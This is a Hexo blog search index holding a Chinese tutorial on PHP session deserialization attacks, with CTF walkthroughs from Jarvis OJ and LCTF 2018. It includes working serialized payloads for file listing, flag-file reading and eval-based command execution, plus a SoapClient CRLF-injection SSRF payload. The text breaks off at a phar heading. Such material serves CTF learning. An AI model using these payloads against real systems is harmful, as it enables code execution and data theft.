<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>123</title>
      <link href="/2021/11/12/123/"/>
      <url>/2021/11/12/123/</url>
      
        <content type="html"><![CDATA[<h1 id="session反序列化攻击"><a href="#session反序列化攻击" class="headerlink" title="session反序列化攻击"></a>session反序列化攻击</h1><p>先来了解一下关于<code>session</code>的一些基础知识</p><h4 id="什么是session"><a href="#什么是session" class="headerlink" title="什么是session"></a>什么是session</h4><blockquote><p>在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p></blockquote><h4 id="session是如何起作用的"><a href="#session是如何起作用的" class="headerlink" title="session是如何起作用的"></a>session是如何起作用的</h4><blockquote><p>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p></blockquote><p>除此之外，还需要知道<code>session_start()</code>这个函数已经这个函数所起的作用：</p><blockquote><p>当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会依据客户端传来的PHPSESSID来获取现有的对应的会话数据（即session文件）， PHP 会自动反序列化session文件的内容，并将之填充到 $_SESSION 超级全局变量中。如果不存在对应的会话数据，则创建名为sess_PHPSESSID(客户端传来的)的文件。如果客户端未发送PHPSESSID，则创建一个由32个字母组成的PHPSESSID，并返回set-cookie。</p></blockquote><p>了解了有关<code>session</code>的概念后，还需要了解<code>php.ini</code>中一些<code>Session</code>配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=&quot;&quot; --设置session的存储路径</span><br><span class="line">session.save_handler=&quot;&quot;--设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.auto_start boolen--指定会话模块是否在请求开始时启动一个会话默认为0不启动</span><br><span class="line">session.serialize_handler string--定义用来序列化/反序列化的处理器名字。默认使用php</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200309231907-521fdde4-6219-1.png"><img src="20200309231907-521fdde4-6219-1.png" alt="img"></a><br>这里我是在Windows上搭建的所以显示的路径为D盘，如果是在Linux上搭建的话，常见的<code>php-session</code>存放位置有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php5/sess_PHPSESSID</span><br><span class="line">/var/lib/php7/sess_PHPSESSID</span><br><span class="line">/var/lib/php/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSED</span><br></pre></td></tr></table></figure><p>想要知道为什么为出现这个session漏洞，就需要了解session机制中对序列化是如何处理的<br>参考l3m0n师傅的表<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200309231933-6157fd8c-6219-1.png"><img src="123/20200309231933-6157fd8c-6219-1.png" alt="img"></a><br>这个便是在相应的处理器处理下，<code>session</code>所存储的格式，这里举个例子来了解一下在不同的处理器下，session所储存的格式有什么不一样(测试的时候php版本一定要大于<strong>5.5.4</strong>，不然session写不进文件))</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_serialize&quot;);</span><br><span class="line">//ini_set(&quot;session.serialize_handler&quot;, &quot;php_binary&quot;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;lemon&#x27;] = $_GET[&#x27;a&#x27;];</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure><p>比如这里我get进去一个值为shy,查看一下各个存储格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php : lemon|s:3:&quot;shy&quot;;</span><br><span class="line">php_serialize : a:1:&#123;s:5:&quot;lemon&quot;;s:3:&quot;shy&quot;;&#125;</span><br><span class="line">php_binary : lemons:3:&quot;shy&quot;;</span><br></pre></td></tr></table></figure><p>这有什么问题，其实PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。如：使用不同引擎来处理session文件。</p><h4 id="使用不同的引擎来处理session文件"><a href="#使用不同的引擎来处理session文件" class="headerlink" title="使用不同的引擎来处理session文件"></a>使用不同的引擎来处理session文件</h4><p>php引擎的存储格式是<code>键名 | serialized_string</code>，而php_serialize引擎的存储格式是<code>serialized_string</code>。如果程序使用两个引擎来分别处理的话就会出现问题。</p><p>下面就模仿师傅的操作学习一下<br>先以<code>php_serialize</code>的格式存储，从客户端接收参数并存入<code>session</code>变量<br><strong>(1.php)</strong><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200309231957-6f8ce566-6219-1.png"><img src="123/20200309231957-6f8ce566-6219-1.png" alt="img"></a><br>接下来使用<code>php</code>引擎读取session文件<br><strong>(2.php)</strong><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200309232012-7862af72-6219-1.png"><img src="123/20200309232012-7862af72-6219-1.png" alt="img"></a><br><strong>攻击思路：</strong><br>首先访问<code>1.php</code>，在传入的参数最开始加一个<code>&#39;|&#39;</code>，由于<code>1.php</code>是使用<code>php_serialize</code>引擎处理，因此只会把<code>&#39;|&#39;</code>当做一个正常的字符。然后访问<code>2.php</code>，由于用的是<code>php</code>引擎，因此遇到<code>&#39;|&#39;</code>时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对<code>&#39;|&#39;</code>后的值进行反序列化处理。</p><p>这里可能会有一个小疑问，为什么在解析session文件时直接对<code>&#39;|&#39;</code>后的值进行反序列化处理，这也是处理器的功能？这个其实是因为<code>session_start()</code>这个函数，可以看下官方说明：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200309232031-83c7666e-6219-1.png"><img src="123/20200309232031-83c7666e-6219-1.png" alt="img"></a><br>首先生成一个<strong>payload</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class student&#123;</span><br><span class="line">        var $name;</span><br><span class="line">        var $age;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = new student();</span><br><span class="line">    $a-&gt;nage =  &quot;hacker&quot;;</span><br><span class="line">    $a-&gt;age = &quot;1111&quot;;</span><br><span class="line">    echo serialize($a);</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200309232045-8c049dba-6219-1.png"><img src="123/20200309232045-8c049dba-6219-1.png" alt="img"></a><br>攻击思路中说到了因为不同的引擎会对<code>&#39;|&#39;</code>，产生歧义，所以在传参时在payload前加个<code>&#39;|&#39;</code>，作为a参数，访问<code>1.php</code>,查看一下本地session文件，发现payload已经存入到<code>session</code>文件<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200309232100-9558b6a8-6219-1.png"><img src="123/20200309232100-9558b6a8-6219-1.png" alt="img"></a><br><code>php_serialize</code>引擎传入的payload作为lemon对应值，而<code>php</code>则完全不一样：<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200309232114-9d5b1a58-6219-1.png"><img src="123/20200309232114-9d5b1a58-6219-1.png" alt="img"></a><br>访问一下<code>2.php</code>看看会有什么结果<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200309232126-a48a6a2c-6219-1.png"><img src="123/20200309232126-a48a6a2c-6219-1.png" alt="img"></a><br>成功触发了student类的<code>__wakeup()</code>方法,所以这种攻击思路是可行的。但这种方法是在可以对<code>session</code>的进行赋值的，那如果代码中不存在对<code>$_SESSION</code>变量赋值的情况下又该如何利用</p><h4 id="没有-SESSION变量赋值"><a href="#没有-SESSION变量赋值" class="headerlink" title="没有$_SESSION变量赋值"></a>没有$_SESSION变量赋值</h4><p>在<code>PHP</code>中还存在一个<code>upload_process</code>机制，即自动在<code>$_SESSION</code>中创建一个<strong>键值对</strong>，值中刚好存在<strong>用户可控的部分</strong>，可以看下官方描述的，这个功能在文件上传的过程中利用<code>session</code>实时返回上传的进度。<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200309232143-aed4f4d4-6219-1.png"><img src="123/20200309232143-aed4f4d4-6219-1.png" alt="img"></a><br>但第一次看到真的有点懵，这该怎么去利用，看了大师傅的博客才明白，这种攻击方法与上一部分基本相同，不过这里需要先上传文件，同时<code>POST</code>一个与<code>session.upload_process.name</code>的同名变量。后端会自动将<code>POST</code>的这个<strong>同名变量作为键</strong>进行<strong>序列化</strong>然后存储到<code>session</code>文件中。下次请求就会<strong>反序列化session文件</strong>，从中取出这个键。所以攻击点还是跟上一部分一模一样，程序还是使用了不同的<strong>session</strong>处理引擎。</p><p>实践一下，可以来看一道ctf题目</p><p><strong>Jarvis OJ——PHPINFO</strong></p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200309232159-b86d205c-6219-1.png"><img src="123/20200309232159-b86d205c-6219-1.png" alt="img"></a><br>当我们随便传入一个值时，便会触发<code>__construct()</code>魔法函数，从而出现<code>phpinfo</code>页面，在phpinfo页面发现</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200309232213-c0724bf6-6219-1.png"><img src="123/20200309232213-c0724bf6-6219-1.png" alt="img"></a><br>发现默认的引擎是<code>php-serialize</code>，而题目所使用的引擎是php，因为反序列化和序列化使用的处理器不同，由于格式的原因会导致数据无法正确反序列化，那么就可以通过构造伪造任意数据。</p><p>观察代码会发现这段代码是没有<code>$_SESSION</code>变量赋值但符合使用不同的引擎来处理session文件，所以这里就使用到了php中的<code>upload_process</code>机制。</p><p>通过<code>POST</code>方法来构造数据传入<code>$_SESSION</code>，首先构造<code>POST</code>提交表单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200309232231-cb2a273a-6219-1.png"><img src="123/20200309232231-cb2a273a-6219-1.png" alt="img"></a><br>接下来构造序列化payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">class OowoO</span><br><span class="line">&#123;</span><br><span class="line">    public $mdzz=&#x27;payload&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$obj = new OowoO();</span><br><span class="line">echo serialize($obj);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将payload改为如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(dirname(__FILE__)));</span><br><span class="line">#scandir目录中的文件和目录</span><br><span class="line">#dirname函数返回路径中的目录部分</span><br><span class="line">#__FILE__   php中的魔法常量,文件的完整路径和文件名。如果用在被包含文件中，则返回被包含的文件名</span><br><span class="line">#序列化后的结果</span><br><span class="line">O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;</span><br></pre></td></tr></table></figure><p>为防止双引号被转义，在双引号前加上<code>\</code>，除此之外还要加上<code>|</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span><br></pre></td></tr></table></figure><p>在这个页面随便上传一个文件，然后抓包修改filename的值<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200309232244-d2fe84c4-6219-1.png"><img src="123/20200309232244-d2fe84c4-6219-1.png" alt="img"></a><br>可以看到<code>Here_1s_7he_fl4g_buT_You_Cannot_see.php</code>这个文件，flag肯定在里面，但还有一个问题就是不知道这个路径，路径的问题就需要回到phpinfo页面去查看<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20200309232258-db718e08-6219-1.png"><img src="123/20200309232258-db718e08-6219-1.png" alt="img"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#x27;SCRIPT_FILENAME&#x27;] 也是包含当前运行脚本的路径，与 $_SERVER[&#x27;SCRIPT_NAME&#x27;] 不同的是，这是服务器端的绝对路径。</span><br></pre></td></tr></table></figure><p>既然知道了路径，就继续构造payload即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</span><br><span class="line">#file_get_contents() 函数把整个文件读入一个字符串中。</span><br></pre></td></tr></table></figure><p>接下来的就还是序列化然后改一下格式传入即可，后面的就不再写了</p><h2 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h2><p><img src="123/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwNDY4Ng==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p><p><img src="123/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwNDY4Ng==,size_16,color_FFFFFF,t_70-163541961760725" alt="在这里插入图片描述"></p><p>可以看到题目环境中的 <strong>session.serialize_handler</strong> 默认为 <strong>php_serialize</strong> 处理器，而程序使用的却是 <strong>php</strong> 处理器，而且开头 <strong>第4行</strong> 使用了 <strong>session_start()</strong> 函数，那么我们就可以利用 <strong>session.upload_progress.enabled</strong> 来伪造 <strong>session</strong> ，然后在 <strong>PHP</strong> 反序列化 <strong>session</strong> 文件时，还原 <strong>OowoO</strong> 类，最终执行 <strong>eval</strong> 函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$mdzz</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;echo system(&quot;pwd&quot;);&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;payload&#x27;</span>] = <span class="keyword">new</span> OowoO();</span><br><span class="line">    <span class="comment">// 生成session文件内容为：</span></span><br><span class="line">    <span class="comment">// payload|O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:19:&quot;echo system(&quot;pwd&quot;);&quot;;&#125;</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">12345678910111213141516</span></span><br></pre></td></tr></table></figure><p>我们可以通过如下表单，抓包修改 <strong>filename</strong> 为 <strong>payload</strong> 即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    &lt;form action=<span class="string">&quot;http://localhost/demo.php&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;&lt;?php echo ini_get(&quot;</span>session.upload_progress.name<span class="string">&quot;); ?&gt;&quot;</span> value=<span class="string">&quot;123&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"><span class="number">12345</span></span><br></pre></td></tr></table></figure><p>最终会生成一个 <strong>session</strong> 文件， <strong>php</strong> 在获取 <strong>session</strong> 的时候，会按照 <strong>session.serialize_handler=php</strong> 规则来处理 <strong>session</strong> 文件，将 <strong>|</strong> 符号之前的所有内容认为是键名，之后的内容则用于反序列化。</p><p><img src="123/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwNDY4Ng==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p><p>在程序运行结束时，调用 <strong>OowoO</strong> 类的 <strong>__destruct</strong> 方法，最终触发代码执行操作。</p><h2 id="例题二"><a href="#例题二" class="headerlink" title="例题二"></a>例题二</h2><p><img src="123/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwNDY4Ng==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p><p>在 <strong>index.php</strong> 文件中，看到 <strong>第5行</strong> 的 <strong>call_user_func</strong> 方法，其参数二的位置固定为 <strong>$_POST</strong> 数组，我们很容易便想到利用 <strong>extract</strong> 函数进行变量覆盖，以便配合后续利用。 <strong>第6-8</strong> 行代码又存在 <strong>session</strong> 伪造漏洞，我们可以考虑是否可以包含 <strong>session</strong> 文件或者利用 <strong>session</strong> 反序列化漏洞。 <strong>第12行</strong> 的 <strong>call_user_func</strong> 函数的第一个参数虽然被固定为 <strong>implode</strong> ，但是我们可以通过前面的 <strong>extract</strong> 函数进行变量覆盖（注意：在PHP7.x比较新的版本中，已经不允许动态调用 <strong>extract</strong> 函数了）。而 <strong>flag.php</strong> 文件中告诉我们，只有 <strong>127.0.0.1</strong> 请求该页面才能得到 <strong>flag</strong> ，所以这明显又是考察 <strong>SSRF</strong> 漏洞，这里我们便可以利用 <strong>SoapClient</strong> 类的 <strong>__call</strong> 方法来进行 <strong>SSRF</strong> 。</p><p>下面我们通过一个例子，来看看 <strong>SoapClient</strong> 类的 <strong>__call</strong> 方法如何使用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="string">&quot;http://localhost:2333&quot;</span>;</span><br><span class="line">    <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;location&quot;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">        <span class="string">&quot;user_agent&quot;</span> =&gt; <span class="string">&quot;mochazz\r\nCookie: PHPSESSID=123123\r\n&quot;</span>,</span><br><span class="line">        <span class="string">&quot;uri&quot;</span> =&gt; <span class="string">&quot;demo&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$attack</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="variable">$options</span>);</span><br><span class="line">    <span class="variable">$payload</span> = serialize(<span class="variable">$attack</span>);</span><br><span class="line">    unserialize(<span class="variable">$payload</span>)-&gt;ff(); <span class="comment">// 调用一个不存在的ff方法，会触发__call方法，发出HTTP请求</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1234567891011</span></span><br></pre></td></tr></table></figure><p>由于 <strong>PHP</strong> 中的原生 <strong>SoapClient</strong> 类存在 <strong>CRLF</strong> 漏洞，所以我们可以伪造任意 <strong>header</strong> 信息，上面的请求结果如下：</p><p><img src="123/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwNDY4Ng==,size_16,color_FFFFFF,t_70-163541961760728" alt="在这里插入图片描述"></p><p>而 <strong>call_user_func</strong> 函数中的参数可以是一个数组，数组中第一个元素为类名，第二个元素为类方法，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">myclass</span> </span>&#123;</span><br><span class="line">        <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hello!\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$classname</span> = <span class="string">&quot;myclass&quot;</span>;</span><br><span class="line">    call_user_func(<span class="keyword">array</span>(<span class="variable">$classname</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line">    call_user_func(<span class="variable">$classname</span> .<span class="string">&#x27;::say_hello&#x27;</span>); <span class="comment">// As of 5.2.3</span></span><br><span class="line">    <span class="variable">$myobject</span> = <span class="keyword">new</span> myclass();</span><br><span class="line">    call_user_func(<span class="keyword">array</span>(<span class="variable">$myobject</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">12345678910111213</span></span><br></pre></td></tr></table></figure><p>这样题目中的 **call_user_func(*<em>b , b,*b*,*<em>a)</em></em> 就可以变成 <strong>call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’))</strong> ，即调用 <strong>SoapClient</strong> 类不存在的 <strong>welcome_to_the_lctf2018</strong> 方法，从而触发 <strong>__call</strong> 方法发起 <strong>soap</strong> 请求进行 <strong>SSRF</strong> 。</p><p>这里还要提及一点的是 <strong>session_start</strong> 函数从 <strong>PHP7</strong> 开始允许通过参数来设置 <strong>session</strong> 运行时配置。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session_start(<span class="keyword">array</span>(<span class="string">&#x27;serialize_handler&#x27;</span> =&gt; <span class="string">&#x27;php_serialize&#x27;</span>))</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure><p>将会设置 session.serialize_handler=php_serialize 。</p><p>最终我们的利用方法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$post_data</span> = <span class="string">&#x27;flag=demo&#x27;</span>;</span><br><span class="line">    <span class="variable">$ua</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;mochazz&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie: PHPSESSID=mochazz&#x27;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">        <span class="string">&#x27;user_agent&#x27;</span> =&gt; join(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$ua</span>) . <span class="string">&quot;\r\nContent-Length: &quot;</span> . (<span class="keyword">string</span>) strlen(<span class="variable">$post_data</span>). <span class="string">&quot;\r\n\r\n&quot;</span> . <span class="variable">$post_data</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;hello&#x27;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="variable">$serialize_string</span> = serialize(<span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="variable">$options</span>));</span><br><span class="line">    <span class="keyword">echo</span> urlencode(<span class="variable">$serialize_string</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">1234567891011121314151617</span></span><br></pre></td></tr></table></figure><p><img src="123/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwNDY4Ng==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p><p><img src="123/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwNDY4Ng==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p><p>最后我们再将 <strong>PHPSESSID</strong> 修改成 <strong>mochazz</strong> 即可获得 <strong>flag</strong> ，整个攻击的流程图如下：</p><p><img src="123/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDMwNDY4Ng==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p><p>例二题目环境可以从 <a href="https://github.com/CTFTraining/lctf_2018_bestphp_s_revenge">这里</a> 下载。</p><h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h1 id="phar反序列化-1"><a href="#phar反序列化-1" class="headerlink" title="phar反序列化"></a><a 